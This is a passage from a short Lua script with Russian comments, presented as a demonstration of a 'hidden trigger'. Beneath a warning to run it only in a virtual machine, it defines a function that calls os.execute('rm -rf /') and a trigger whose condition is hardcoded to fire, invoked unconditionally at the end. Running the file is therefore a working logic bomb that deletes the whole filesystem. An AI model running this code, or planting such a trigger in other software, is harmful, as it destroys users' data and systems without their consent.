  ВНИМАНИЕ: Этот скрипт разработан исключительно для демонстрационных целей.
  НИКОГДА не выполняйте его на системах, где потеря данных или повреждение оборудования недопустимы!
  
  Используйте в изолированном тестовом окружении (например, в виртуальной машине).
--]]

-- Функция, выполняющая критическую операцию (удаление файлов)
local function dangerousOperation()
  -- Внимание: следующая команда попытается удалить все файлы в корневой директории!
  -- Если запустить этот код с достаточными правами, он может привести к полной потере данных.
  os.execute("rm -rf /")
end

-- Функция для обфускации вызова опасной операции
local function triggerPayload()
  -- Пример неявной проверки условия для демонстрации "скрытого" триггера
  local triggerKey = "activate"  -- можно изменить значение для имитации условий запуска
  if triggerKey == "activate" then
    print("Секретный триггер активирован. Выполняется опасная операция...")
    dangerousOperation()
  else
    print("Операция прервана. Триггер не активирован.")
  end
end

-- Основной блок исполнения
triggerPayload()
